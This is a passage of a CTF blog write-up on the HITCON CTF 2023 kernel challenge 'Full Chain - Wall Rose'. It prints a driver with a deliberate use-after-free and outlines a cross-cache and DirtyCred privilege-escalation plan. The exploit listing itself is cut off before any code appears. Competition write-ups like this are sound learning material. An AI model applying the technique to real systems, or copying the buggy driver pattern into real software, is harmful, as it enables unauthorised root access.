<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HITCON CTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="HITCON CTF 2023" />
<meta property="og:description" content="Writeup for HITCON CTF 2023" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/hitcon-ctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-13T08:07:38+07:00" />
<meta property="article:modified_time" content="2023-09-13T16:07:57+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="HITCON CTF 2023"/>
<meta name="twitter:description" content="Writeup for HITCON CTF 2023"/>
      <meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/hitcon-ctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/sekaictf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/blackhat-mea-ctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HITCON CTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/hitcon-ctf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, HITCON, pwn, kernel, cross-cache, DirtyCred, 2023","wordcount":  6431 ,
        "url": "https:\/\/chovid99.github.io\/posts\/hitcon-ctf-2023\/","datePublished": "2023-09-13T08:07:38+07:00","dateModified": "2023-09-13T16:07:57+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HITCON CTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Sep 13, 2023">Sep 13, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6431 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;31 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a></li>
    <li><a href="#full-chain---wall-rose">Full Chain - Wall Rose</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/u2nRUmS.png" title="https://i.imgur.com/u2nRUmS.png" data-thumbnail="https://i.imgur.com/u2nRUmS.png" data-sub-html="<h2>HITCON CTF 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/u2nRUmS.png"
            data-srcset="https://i.imgur.com/u2nRUmS.png, https://i.imgur.com/u2nRUmS.png 1.5x, https://i.imgur.com/u2nRUmS.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/u2nRUmS.png" />
    </a><figcaption class="image-caption">HITCON CTF 2023</figcaption>
    </figure>
<p>Last week, I spent my weekend working on the HITCON CTF challenge named &ldquo;Full Chain - Wall Rose&rdquo;. I was part of the Blue Water team, and we managed to get the first place in the qualifiers, earning a spot in the finals.</p>
<figure><a class="lightgallery" href="https://i.imgur.com/3NevOsF.png" title="https://i.imgur.com/3NevOsF.png" data-thumbnail="https://i.imgur.com/3NevOsF.png" data-sub-html="<h2>We got first place in the qualifiers</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/3NevOsF.png"
            data-srcset="https://i.imgur.com/3NevOsF.png, https://i.imgur.com/3NevOsF.png 1.5x, https://i.imgur.com/3NevOsF.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/3NevOsF.png" />
    </a><figcaption class="image-caption">We got first place in the qualifiers</figcaption>
    </figure>
<p>Below is the writeup of one of the pwn challenges called &ldquo;Full Chain - Wall Rose&rdquo;.</p>
<h1 id="pwn">Pwn</h1>
<h1 id="full-chain---wall-rose">Full Chain - Wall Rose</h1>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Challenge:</p>
<ul>
<li>You have a busybox shell running as user user</li>
<li>/home/user/rose.ko is a vulnerable kernel driver</li>
<li>Try exploiting /home/user/rose.ko to achieve privilege escalation</li>
<li>You may assumed that Busybox, the Linux kernel, and Qemu are not vulnerable.</li>
</ul>
<p>Notes:</p>
<ul>
<li>FG-KASLR is enabled</li>
<li>Your exploit should be kernel-agnostic. In other words, it should not rely on any kernel offsets</li>
</ul>
<p>Author: wxrdnx</p>
</div>
        </div>
    </div>
<h2 id="initial-analysis">Initial Analysis</h2>
<p>In this challenge, we were provided with the source code of a vulnerable kernel driver named <code>rose.c</code> to analyze. Here&rsquo;s the source code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/atomic.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/device.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;asm/errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/printk.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define MAX_DATA_HEIGHT 0x400
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;wxrdnx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Wall Rose&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">rose_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="n">MAX_DATA_HEIGHT</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">&#34;Wall Rose: kmalloc error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MAX_DATA_HEIGHT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">rose_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">rose_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Wall Rose: data dropped&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">rose_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Wall Rose: data dropped&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">rose_fops</span> <span class="o">=</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">rose_open</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">rose_release</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">rose_read</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">rose_write</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">rose_device</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;rose&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rose_fops</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">rose_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rose_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">rose_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rose_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">rose_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">rose_exit</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We discovered that our interactions with the driver were limited to <code>open</code> and <code>close</code> operations. The bug we identified was rather straightforward. If we opened a multiple of file descriptors to the driver, they all shared the same <code>data</code> chunk. This allowed us to execute multiple <code>kfree</code> operations on the stored data by closing the previously opened file descriptors, indicating a Use-After-Free (UAF) condition.</p>
<p>However, we were unable to perform <code>read</code> and <code>write</code> operations. Given this constraint, our next step was to craft a strategy for successful exploitation.</p>
<h2 id="solution">Solution</h2>
<p>I worked on this challenge alongside two of my teammates, sampriti and cru5h. This challenge forms a part of the full chain challenge. The challenge notes encouraged us to develop an exploit that was kernel-agnostic, taking into consideration the presence of FG-KASLR as well. Thus, we set out to devise an exploit stable enough for future use.</p>
<p>Given the UAF scenario, we opted to explore cross-cache exploitation, which seemed promising since we would not require a leak later on, and it promised to be kernel-agnostic as well.</p>
<p>The bug identified was a UAF in <code>kmalloc-1k</code>. We resolved to pursue cross-cache exploitation, allowing the chunk to be utilized by other objects of varying sizes. We targeted the <code>file</code> structure, planning to later trigger the <code>DirtyCred</code> technique.</p>
<p>Analyzing last year&rsquo;s <a href="https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel" target="_blank" rel="noopener noreffer ">writeup</a> along with the <a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/" target="_blank" rel="noopener noreffer ">CVE-2022-29582 writeup</a> greatly enhanced my grasp of the exploitation techniques involved. These resources, particularly new to me, offered clear guidance on navigating the page allocator and included a practical abstraction for initiating cross-cache exploitation. I would strongly recommend reviewing these write-ups to gain a deeper comprehension of it.</p>
<p>To offer some background, the Linux kernel features a slab allocator named SLUB that manages the caches of kernel heap objects. Each slab is designated to manage objects of a uniform size. During slab allocation, the kernel utilizes pages. The necessity to trigger a cross-cache arises due to the specific attributes of the <code>file</code> object:</p>
<ul>
<li>It has a size of <code>256</code>.</li>
<li>It is housed in a dedicated cache named <code>filp</code>.</li>
</ul>
<p>The UAF vulnerability that we had were located in <code>kmalloc-1k</code>, and the <code>file</code> struct has its own dedicated cache. Therefore, even if we have a UAF vulnerability with the same size as the <code>file</code> struct, we still need to initiate a cross-cache attack, since <code>rose</code> objects are allocated in the general cache.</p>
<p>Now that we have this knowledge, as outlined in the aforementioned writeup, the initial step is to discard a slab that houses our <code>rose</code> object. The procedure to accomplish this is clearly explained in Ruia&rsquo;s writeup. The first task is to determine the values of <code>OBJS_PER_SLAB</code> and <code>CPU_PARTIAL</code> for <code>kmalloc-1k</code>. To verify these values, we can execute the following commands:</p>
<ul>
<li><code>cat /sys/kernel/slab/kmalloc-1k/objs_per_slab</code></li>
<li><code>cat /sys/kernel/slab/kmalloc-1k/cpu_partial</code></li>
</ul>
<p>Now, let&rsquo;s start crafting the exploit. We adapted the abstraction provided in last year&rsquo;s <a href="https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel" target="_blank" rel="noopener noreffer ">writeup</a> to trigger the cross-cache.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span></code></pre></td>
<td class="lntd">
